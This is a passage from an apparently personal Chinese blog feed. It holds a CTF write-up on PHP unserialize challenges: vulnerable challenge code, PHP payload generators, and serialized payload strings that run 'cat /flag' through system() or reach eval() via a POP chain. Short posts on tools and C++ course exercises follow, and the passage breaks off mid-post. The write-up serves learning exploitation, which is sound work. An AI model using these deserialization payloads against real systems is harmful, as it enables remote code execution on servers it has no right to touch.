php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//private和public序列化字符串差异</span><br><span class="hljs-comment">///?data=O:1:&quot;A&quot;:2:&#123;s:7:&quot;Aevil&quot;;s:2:&quot;ls&quot;;s:4:&quot;Aa&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;Bb&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br><span class="hljs-comment">///?data=O:1:&quot;A&quot;:2:&#123;s:4:&quot;evil&quot;;s:2:&quot;ls&quot;;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;Bb&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>题目代码      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable language_">$this</span>-&gt;evil);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br><br><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br> &#123;<br>     <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> &#125;<br><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>payload1      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br> <br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;evil=<span class="hljs-string">&quot;ls&quot;</span>;<br>    &#125;<br> <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;system&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>());<br> <br>http:<span class="hljs-comment">//127.0.0.1:63135/?data=O:1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00evil&quot;;s:9:&quot;cat /flag&quot;;s:4:&quot;%00A%00a&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;%00B%00b&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>payload2      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;evil = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>        <span class="hljs-comment">// $s($this-&gt;evil);</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span> ;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div><h2 id="Note-低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。"><a href="#Note-低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。" class="headerlink" title="Note:低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。"></a>Note:低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。</h2><p><strong>原先通过构造函数的方式对private修饰的属性一直过不了，出现的报错是：Uncaught Error: Function name must be a string，根本没有完成赋值，后来终于找到了这个坑点：（引用先知社区）</strong><br><img src="/dong.github/images/0914.png"><br><strong>会发现在Threezh1的左右，也就是属性名中的类名左右存在两个空字节。所以反序列化不成功的原因就是由于序列化内容生成到网页后，空字节不会一同生成出去，导致反序列化的时候无法识别是private属性，反序列化失败。</strong><br><img src="/dong.github/images/0914-1.png"><br><strong>那解决这个问题的方法就是，在传递反序列化字符串中，在类名的左右加上%00，也就是空字节对于的URL编码。</strong><br><strong>于是就有了payload1（正解）</strong></p><h1 id="Pop-moe"><a href="#Pop-moe" class="headerlink" title="Pop moe"></a>Pop moe</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-05eef982" role="button" aria-expanded="false" aria-controls="collapse-05eef982">        <div class="fold-arrow">▶</div>题目      </div>      <div class="fold-collapse collapse" id="collapse-05eef982">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;FAILED TO ATTACK&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;<br>        <span class="hljs-variable">$a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-90469042" role="button" aria-expanded="false" aria-controls="collapse-90469042">        <div class="fold-arrow">▶</div>payload      </div>      <div class="fold-collapse collapse" id="collapse-90469042">        <div class="fold-content">          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span>  <span class="hljs-variable">$payl0ad</span>;<br><span class="hljs-keyword">public</span>  <span class="hljs-variable">$what</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;payl0ad = <span class="hljs-string">&#x27;0&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;what = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class001</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;payl0ad = <span class="hljs-string">&#x27;dangerous&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class002</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$sec</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;sec = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class003</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;mystr = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class000</span>();<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>CTF赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Practicetools</title>
    <link href="/dong.github/2024/09/13/Practicetools/"/>
    <url>/dong.github/2024/09/13/Practicetools/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>记录一些工具，有时间慢慢鼓捣</strong></p><span id="more"></span><h1 id="Slidev"><a href="#Slidev" class="headerlink" title="Slidev"></a><a href="https://cn.sli.dev/guide/">Slidev</a></h1><p><strong>Slidev 的幻灯片以 Markdown 的格式编写。</strong></p><h1 id="Hyprland"><a href="#Hyprland" class="headerlink" title="Hyprland"></a><a href="https://hyprland.org/">Hyprland</a></h1><p><strong>配置炫酷的Linux桌面环境</strong></p><h1 id="Archlinux"><a href="#Archlinux" class="headerlink" title="Archlinux"></a><a href="https://archlinux.org/">Archlinux</a></h1><p><strong>能够被魔改的定制化 Linux 发行版</strong><br><a href="https://zhuanlan.zhihu.com/p/500601393">Ubuntu or Arch?</a></p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>课堂练习</title>
    <link href="/dong.github/2024/09/12/Scupractice/"/>
    <url>/dong.github/2024/09/12/Scupractice/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a><a href="https://acm.scu.edu.cn/teach/">平台</a></h1><p><strong>SCU自家题库，大二上学期数据结构与算法课题目。</strong></p><h1 id="第一周习题"><a href="#第一周习题" class="headerlink" title="第一周习题"></a>第一周习题</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>数组查找      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">100</span>;<br><span class="hljs-type">int</span> a[maxn];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<span class="hljs-built_in">cin</span> &gt;&gt; n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;++ i)<br>&#123;<br><span class="hljs-built_in">cin</span> &gt;&gt; a[i] ;<br>&#125;<br><span class="hljs-type">int</span> m;<br><span class="hljs-built_in">cin</span> &gt;&gt; m;<br><span class="hljs-type">int</span> tmp = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i] == m)<br>&#123;<br>tmp = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = tmp+<span class="hljs-number">1</span>;i &lt; n;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i] &gt; m)&#123;<br>ans ++ ;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(tmp == <span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;none&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; ans;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>数组合并      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">100</span>;<br><span class="hljs-type">int</span> a[maxn];<br><span class="hljs-type">int</span> b[maxn];<br><span class="hljs-type">int</span> c[maxn];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,m;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;++ i)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; m;++ i)<br>&#123;<br>cin &gt;&gt; b[i];<br>&#125;<br><span class="hljs-type">int</span> pa = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pb = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pc = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(pa &lt; n || pb &lt; m)<br>&#123;<br><span class="hljs-keyword">if</span>(pa &gt;= n)<br>&#123;<br>c[pc++] = b[pb++];<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(pb &gt;= m)&#123;<br>c[pc++] = a[pa++];<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(a[pa] &lt; b[pb])<br>&#123;<br>c[pc++] = a[pa++];<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>c[pc++] = b[pb++];<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; pc;++ i)<br>&#123;<br>cout &lt;&lt; c[i] &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i==pc];<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>二阶魔方      </div>      <div 